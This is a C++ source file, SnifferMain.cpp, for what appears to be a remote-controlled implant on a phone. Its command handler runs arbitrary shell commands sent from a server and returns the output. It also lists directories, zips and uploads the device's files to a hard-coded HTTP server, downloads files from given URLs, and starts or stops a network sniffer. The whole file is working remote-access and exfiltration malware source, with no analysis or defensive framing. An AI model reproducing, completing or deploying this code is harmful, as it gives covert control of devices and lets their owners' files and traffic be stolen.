/*
 * SnifferMain.cpp
 *
 *  Created on: 2015-11-14
 *      Author: Max
 */

#include "SnifferMain.h"

#include <common/KZip.h>
#include <sys/stat.h>

SnifferMain::SnifferMain() {
	// TODO Auto-generated constructor stub
	string website = "http://";
	website += ServerAdess;
	website += ":";
	char port[8];
	sprintf(port, "%d", HttpServerPort);
	website += port;
	mHttpRequestHostManager.SetWebSite(website);
	mHttpRequestManager.SetHostManager(&mHttpRequestHostManager);
	mHttpRequestManager.SetVersionCode("Version", SnifferVersion);
}

SnifferMain::~SnifferMain() {
	// TODO Auto-generated destructor stub
}

void SnifferMain::OnRecvCommand(SnifferClient* client, const SCMD &scmd) {
	switch(scmd.header.scmdt) {
	case ExcuteCommand:{
		// 执行Shell命令
		string cmd = scmd.param;
		string result = SystemComandExecuteWithResult(cmd);

		FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 执行 : %s )", cmd.c_str());
		FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 执行结果 : %s )", result.c_str());

		// 返回命令结果
		SCMD scmdSend;
		scmdSend.header.scmdt = ExcuteCommand;
		scmdSend.header.bNew = false;
		scmdSend.header.seq = scmd.header.seq;
		scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
		memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
		scmdSend.param[scmdSend.header.len] = '\0';
		client->SendCommand(scmdSend);

	}break;
	case SnifferListDir:{
		// 列目录
		HandleGetClientDir(scmd);

	}break;
	case SinfferTypeStart:{
		// 开始监听
		FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 开始监听 )");
		mSniffer.StartSniffer();

	}break;
	case SinfferTypeStop:{
		// 停止监听
		FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 停止监听 )");
		mSniffer.StopSniffer();

	}break;
	case SinfferTypeVersion:{
		// 返回版本
		FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 返回版本号 : %s )", SnifferVersion);

		SCMD scmdSend;
		scmdSend.header.scmdt = SinfferTypeVersion;
		scmdSend.header.bNew = false;
		scmdSend.header.seq = scmd.header.seq;
		scmdSend.header.len = MIN(strlen(SnifferVersion), MAX_PARAM_LEN - 1);
		memcpy(scmdSend.param, SnifferVersion, scmdSend.header.len);
		scmdSend.param[scmdSend.header.len] = '\0';
		client->SendCommand(scmdSend);

	}break;
	case SnifferUploadFile:{
		// 上传文件
		HandleUploadFile(scmd);

	}break;
	case SnifferDownloadFile:{
		// 下载文件
		HandleDownloadFile(scmd);

	}break;
	case SinfferTypeNone:{
		// 与服务端连接已经断开

	}break;
	default:break;
	}
}

bool SnifferMain::Run() {
	FileLog(SnifferLogFileName, "SnifferMain::Run()");

	bool bFlag = false;

	// 获取手机信息
	GetPhoneInfo();

	mSnifferClient.SetSnifferClientCallback(this);
	bFlag = mSnifferClient.Start();

	FileLog(SnifferLogFileName, "SnifferMain::Run( bFlag : %s )", bFlag?"true":"false");

	return bFlag;
}

void SnifferMain::OnTaskFinish(ITask* pTask) {
	FileLog(SnifferLogFileName, "SnifferMain::OnTaskFinish( pTask : %p )", pTask);
	delete pTask;
}

void SnifferMain::OnUpload(bool success, const string& filePath, RequestUploadTask* task) {
	FileLog(SnifferLogFileName,
			"SnifferMain::OnUpload( "
			"success : %s,"
			"filePath : %s, "
			"task : %p "
			")",
			success?"true":"false",
			filePath.c_str(),
			task
			);

	Json::FastWriter writer;
	Json::Value rootSend;
	rootSend[COMMON_RET] = success?1:0;
	string website = "http://";
	website += ServerAdess;
	website += ":";
	char port[8];
	sprintf(port, "%d", HttpServerPort);
	website += port;

	rootSend[DOWN_SERVER_ADDRESS] = website;
	rootSend[FILEPATH] = filePath;

	string result;
	result = writer.write(rootSend);

	SCMD scmdSend;
	scmdSend.header.scmdt = SnifferUploadFile;
	scmdSend.header.bNew = false;
	scmdSend.header.seq = task->GetSCMDH().seq;
	scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
	memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
	mSnifferClient.SendCommand(scmdSend);
}

void SnifferMain::OnDownload(bool success, const string& filePath, RequestDownloadTask* task) {
	FileLog(SnifferLogFileName,
			"SnifferMain::OnDownload( "
			"success : %s,"
			"filePath : %s, "
			"task : %p "
			")",
			success?"true":"false",
			filePath.c_str(),
			task
			);

	Json::FastWriter writer;
	Json::Value rootSend;
	rootSend[COMMON_RET] = success?1:0;
	rootSend[FILEPATH] = filePath;

	string result;
	result = writer.write(rootSend);

	SCMD scmdSend;
	scmdSend.header.scmdt = SnifferDownloadFile;
	scmdSend.header.bNew = false;
	scmdSend.header.seq = task->GetSCMDH().seq;
	scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
	memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
	mSnifferClient.SendCommand(scmdSend);
}

void SnifferMain::HandleGetClientDir(const SCMD &scmd) {
	Json::FastWriter writer;
	Json::Value rootSend;
	string result;
	rootSend[COMMON_RET] = 0;

    Json::Reader reader;
    Json::Value rootRecv;
    reader.parse(scmd.param, rootRecv);

    int index = 0;
    if( rootRecv[COMMON_PAGE_INDEX].isInt() ) {
    	index = rootRecv[COMMON_PAGE_INDEX].asInt();
    }

    int size = 0;
    if( rootRecv[COMMON_PAGE_SIZE].isInt() ) {
    	size = rootRecv[COMMON_PAGE_SIZE].asInt();
    }

    string dir = "";
    if( rootRecv[DIRECTORY].isString() ) {
    	dir = rootRecv[DIRECTORY].asString();
    }

	DIR *dirp;
	dirent *dp;
	struct stat statbuf;
	int i = 0;
	char st_size[32];

    if( (dirp = opendir(dir.c_str())) != NULL ) {
    	rootSend[COMMON_RET] = 1;
    	int i = 0;

    	while( (dp = readdir(dirp)) != NULL ) {
			Json::Value dirItem;
			dirItem[D_TYPE] = dp->d_type;

			string m = GetFileMode(&statbuf);
			dirItem[D_MODE] = m;

			string absPath = dir + dp->d_name;
			stat(absPath.c_str(), &statbuf);
			sprintf(st_size, "%lld", statbuf.st_size);
			dirItem[D_SIZE] = st_size;

			dirItem[D_NAME] = dp->d_name;

			if( dp->d_type == DT_DIR ) {
				if( strcmp(dp->d_name, ".") != 0 ) {
					if( i >= index * size && i < (index + 1) * size ) {
						rootSend[FILE_LIST].append(dirItem);
					}
					i++;
				}
			} else {
				if( i >= index * size && i < (index + 1) * size ) {
					rootSend[FILE_LIST].append(dirItem);
				}
				i++;
			}

    	 }

    	 closedir(dirp);

    	 rootSend[COMMON_TOTAL] = i;
    }

    result = writer.write(rootSend);

	SCMD scmdSend;
	scmdSend.header.scmdt = SnifferListDir;
	scmdSend.header.bNew = false;
	scmdSend.header.seq = scmd.header.seq;
	scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
	memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
	scmdSend.param[scmdSend.header.len] = '\0';
	mSnifferClient.SendCommand(scmdSend);

}

void SnifferMain::HandleUploadFile(const SCMD &scmd) {
	// 上传文件到服务器
	char deviceId[128] = {'\0'};
	memset(deviceId, '\0', sizeof(deviceId));
	list<IpAddressNetworkInfo> infoList = IPAddress::GetNetworkInfoList();
	if( infoList.size() > 0 && infoList.begin() != infoList.end() ) {
		IpAddressNetworkInfo info = *(infoList.begin());
		GetMD5String(info.mac.c_str(), deviceId);
	}

	RequestUploadTask* task = new RequestUploadTask();

	// 文件路径
	string filePath = scmd.param;

	struct stat statbuf;
	if( 0 == stat(filePath.c_str(), &statbuf) ) {
		if( S_ISDIR(statbuf.st_mode) ) {
			FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 上传目录 : %s )", filePath.c_str());
			// 打包
			KZip zip;
			zip.CreateZipFromDir(filePath, filePath + ".zip");
			filePath += ".zip";
		} else {
			FileLog(SnifferLogFileName, "SnifferMain::OnRecvCommand( 上传文件 : %s )", filePath.c_str());
		}
	}

	task->SetTaskCallback(this);
	task->SetCallback(this);
	task->Init(&mHttpRequestManager);
	task->SetSCMDH(scmd.header);
	task->SetParam(deviceId, filePath);
	if( !task->Start() ) {
		Json::FastWriter writer;
		Json::Value rootSend;
		rootSend[COMMON_RET] = 0;
		rootSend[DOWN_SERVER_ADDRESS] = "";
		rootSend[FILEPATH] = "";

		string result;
		result = writer.write(rootSend);

		SCMD scmdSend;
		scmdSend.header.scmdt = SnifferUploadFile;
		scmdSend.header.bNew = false;
		scmdSend.header.seq = task->GetSCMDH().seq;
		scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
		memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
		mSnifferClient.SendCommand(scmdSend);
	}
}

void SnifferMain::HandleDownloadFile(const SCMD &scmd) {
	// 下载文件到客户端
    Json::Reader reader;
    Json::Value rootRecv;
    reader.parse(scmd.param, rootRecv);

    // 地址
    string url = "";
    if( rootRecv[URL].isString() ) {
    	url = rootRecv[URL].asString();
    }

    // 文件路径
    string filePath = "";
    if( rootRecv[FILEPATH].isString() ) {
    	filePath = rootRecv[FILEPATH].asString();
    }

	RequestDownloadTask* task = new RequestDownloadTask();
	task->SetTaskCallback(this);
	task->SetCallback(this);
	task->SetSCMDH(scmd.header);
	task->SetParam(url, filePath);
	if( !task->Start() ) {
		Json::FastWriter writer;
		Json::Value rootSend;
		rootSend[COMMON_RET] = 0;

		string result;
		result = writer.write(rootSend);

		SCMD scmdSend;
		scmdSend.header.scmdt = SnifferDownloadFile;
		scmdSend.header.bNew = false;
		scmdSend.header.seq = task->GetSCMDH().seq;
		scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
		memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
		mSnifferClient.SendCommand(scmdSend);
	}

}

string SnifferMain::GetFileMode(const struct stat* statbuf) {
	int st_mode = statbuf->st_mode;
	string m = "-";

	// onwer
	if( st_mode & S_IRUSR ) {
		m += "r";
	} else {
		m += "-";
	}

	if( st_mode & S_IWUSR ) {
		m += "w";
	} else {
		m += "-";
	}

	if( st_mode & S_IXUSR ) {
		m += "x";
	} else {
		m += "-";
	}

	// group
	if( st_mode & S_IRGRP ) {
		m += "r";
	} else {
		m += "-";
	}

	if( st_mode & S_IWGRP ) {
		m += "w";
	} else {
		m += "-";
	}

	if( st_mode & S_IXGRP ) {
		m += "x";
	} else {
		m += "-";
	}

	// other
	if( st_mode & S_IROTH ) {
		m += "r";
	} else {
		m += "-";
	}

	if( st_mode & S_IWOTH ) {
		m += "w";
	} else {
		m += "-";
	}

	if( st_mode & S_IXOTH ) {
		m += "x";
	} else {
		m += "-";
	}

	return m;
}
